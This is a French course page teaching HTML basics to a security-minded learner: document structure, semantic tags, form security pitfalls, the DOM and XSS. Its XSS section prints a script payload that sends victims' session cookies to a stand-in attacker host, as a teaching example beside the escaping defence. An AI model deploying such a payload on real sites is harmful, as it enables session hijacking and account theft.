---
id: 01-html
title: HTML - Structure du web
sidebar_position: 1
---

# HTML — La structure du web

## Ce qu'est (et n'est pas) HTML

HTML (HyperText Markup Language) n'est **pas un langage de programmation** : c'est un **langage de balisage** (markup). Il ne calcule rien, ne prend pas de décision — il **décrit la structure et le sens** d'un document : « ceci est un titre, ceci est un paragraphe, ceci est un formulaire ». C'est le squelette de toute page web. Le CSS l'habille (mise en forme), le JavaScript l'anime (comportement).

Le trio du web se répartit ainsi : **HTML = structure**, **CSS = présentation**, **JavaScript = comportement**. Garder ces rôles séparés est un principe fondamental de qualité (separation of concerns).

Pour ton profil cyber : HTML est le point d'entrée du web côté client. Comprendre sa structure est indispensable pour le pentest web — c'est ce que tu inspectes, manipules et injectes. Les formulaires HTML sont la surface d'attaque principale d'une application web.

## L'anatomie d'un document

```html
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ma page</title>
</head>
<body>
    <h1>Bonjour</h1>
    <p>Contenu de la page.</p>
</body>
</html>
```

Décortiquons :
- `<!DOCTYPE html>` — déclare que c'est du HTML5 (toujours en première ligne).
- `<html lang="fr">` — la racine ; `lang` aide l'accessibilité et le SEO.
- `<head>` — les **métadonnées** (invisibles dans la page) : encodage, titre de l'onglet, liens vers CSS/JS, viewport pour le responsive.
- `<meta charset="UTF-8">` — l'encodage. **Toujours UTF-8**, sinon les accents cassent (et c'est aussi une considération de sécurité : un mauvais encodage peut ouvrir des contournements de filtres XSS).
- `<body>` — le **contenu visible**.

## Les balises et leur sémantique

Une balise s'écrit `<nom>contenu</nom>`. Certaines sont **auto-fermantes** (`<img>`, `<br>`, `<input>`). Les balises ont des **attributs** : `<balise attribut="valeur">`.

Le point clé du HTML moderne est la **sémantique** : utiliser la balise qui décrit le *sens* du contenu, pas juste son apparence.

```html
<!-- Structure sémantique d'une page (HTML5) -->
<header>En-tête du site</header>
<nav>Menu de navigation</nav>
<main>
    <article>
        <h1>Titre de l'article</h1>
        <section>
            <h2>Une section</h2>
            <p>Un paragraphe avec du <strong>texte important</strong>
               et un <a href="https://exemple.fr">lien</a>.</p>
        </section>
    </article>
    <aside>Contenu annexe</aside>
</main>
<footer>Pied de page</footer>
```

Pourquoi la sémantique compte :
- **Accessibilité** — les lecteurs d'écran (pour les malvoyants) s'appuient sur ces balises pour naviguer.
- **SEO** — les moteurs de recherche comprennent mieux la structure.
- **Maintenabilité** — un `<nav>` est plus clair qu'un `<div class="menu">`.

Éviter la « **divite** » : mettre des `<div>` partout au lieu des balises sémantiques (`<header>`, `<nav>`, `<article>`...) est un anti-pattern. La `<div>` (bloc générique) et la `<span>` (inline générique) ne servent que quand aucune balise sémantique ne convient.

Les balises courantes à connaître : titres `<h1>` à `<h6>` (hiérarchie, un seul `<h1>` par page), paragraphes `<p>`, listes `<ul>`/`<ol>`/`<li>`, liens `<a href>`, images `<img src alt>`, tableaux `<table>`, et les conteneurs `<div>`/`<span>`.

## Les formulaires : la surface d'attaque du web

Les formulaires sont **le** point critique côté sécurité — c'est par eux que les données utilisateur entrent dans l'application.

```html
<form action="/login" method="POST">
    <label for="user">Utilisateur :</label>
    <input type="text" id="user" name="username" required>

    <label for="pass">Mot de passe :</label>
    <input type="password" id="pass" name="password" required>

    <input type="email" name="email" placeholder="email@exemple.fr">
    <input type="number" name="age" min="0" max="120">
    <input type="hidden" name="csrf_token" value="...">

    <select name="pays">
        <option value="fr">France</option>
        <option value="be">Belgique</option>
    </select>

    <textarea name="message" rows="4"></textarea>

    <button type="submit">Envoyer</button>
</form>
```

Les points de sécurité essentiels :

**`method` : GET vs POST.** GET met les données dans l'URL (visibles, dans l'historique, les logs) — jamais pour des données sensibles. POST les met dans le corps de la requête. Un mot de passe en GET est une faute grave.

**La validation côté client n'est PAS une sécurité.** Les attributs `required`, `min`, `max`, `type="email"` améliorent l'expérience utilisateur, mais **un attaquant les contourne trivialement** (il envoie une requête HTTP directement, sans passer par ton HTML, avec curl ou Burp). Règle absolue : **toute validation doit être refaite côté serveur**. La validation HTML/JS est du confort, jamais une barrière.

**Les champs cachés (`type="hidden"`) sont modifiables.** « Caché » ne veut pas dire « sécurisé » : l'utilisateur voit et modifie le HTML. Ne jamais faire confiance à un prix, un ID ou un rôle stocké dans un champ caché. C'est un classique de CTF web (modifier un `<input type="hidden" name="price" value="100">`).

**Le token CSRF.** Le champ caché `csrf_token` est une protection contre les attaques CSRF (Cross-Site Request Forgery), où un site malveillant fait exécuter une action à ton insu sur un site où tu es connecté. On y revient dans le cours PHP.

## Le DOM : ce que voit JavaScript

Quand le navigateur charge du HTML, il le transforme en **DOM** (Document Object Model) : une représentation en arbre de la page, où chaque balise devient un « nœud » manipulable. C'est cette structure que JavaScript modifie pour rendre les pages dynamiques (cours JS).

```html
<div id="resultat" class="box">
    <p>Texte</p>
</div>
```

Cet arbre (div → p → texte) est ce que JS parcourt et modifie. Les attributs `id` (unique) et `class` (réutilisable) sont les points d'ancrage pour cibler les éléments, en JS comme en CSS.

## HTML et les vulnérabilités XSS

Puisque le HTML affiche du contenu, injecter du HTML/JS malveillant dans une page est la base du **XSS** (Cross-Site Scripting) — la vulnérabilité web la plus répandue. Le principe : si une application affiche une donnée utilisateur sans l'échapper, un attaquant peut y glisser du code.

```html
<!-- Si un site affiche brutalement un commentaire utilisateur : -->
<p>Commentaire : Bonjour !</p>

<!-- Un attaquant soumet ceci comme "commentaire" : -->
<script>document.location='http://attaquant.fr/vol?c='+document.cookie</script>

<!-- ...qui s'exécute chez toutes les victimes qui voient la page,
     volant leurs cookies de session -->
```

La compréhension côté HTML : tout ce qui vient de l'utilisateur et se retrouve dans la page doit être **échappé** (les `<` deviennent `&lt;`, etc.) pour être affiché comme du texte inerte et non interprété comme des balises. C'est la responsabilité du code serveur (cours PHP) ou du framework, mais ça se comprend au niveau HTML : le danger vient de ce que le navigateur interprète les balises. Les trois types de XSS (reflected, stored, DOM-based) sont détaillés dans les cours JS et PHP.

## Bonnes pratiques

- **Toujours** `<!DOCTYPE html>`, `charset="UTF-8"`, `lang`.
- Balises **sémantiques** plutôt que `<div>` partout.
- Attribut `alt` sur les images (accessibilité + affiché si l'image casse).
- Séparer structure (HTML), présentation (CSS externe), comportement (JS externe) — pas de style inline ni de `onclick=` dans le HTML.
- Valider le HTML avec le validateur du W3C.
- Ne **jamais** faire confiance à la validation côté client.

## Ce qu'il faut retenir

- HTML est un langage de **balisage** (structure/sens), pas de programmation. Trio web : HTML (structure), CSS (présentation), JS (comportement).
- Un document a un `<head>` (métadonnées) et un `<body>` (contenu) ; toujours DOCTYPE, UTF-8, lang.
- Privilégie les balises **sémantiques** (`<header>`, `<nav>`, `<article>`) pour l'accessibilité, le SEO et la clarté.
- Les **formulaires** sont la principale surface d'attaque : POST pour le sensible, et **toute validation côté client est contournable** → revalider côté serveur, ne jamais faire confiance aux champs cachés.
- Le HTML devient le **DOM** (arbre manipulé par JS) ; `id` et `class` sont les points d'ancrage.
- Le **XSS** naît de l'affichage non échappé de données utilisateur → le navigateur interprète des balises injectées. L'échappement est la parade.
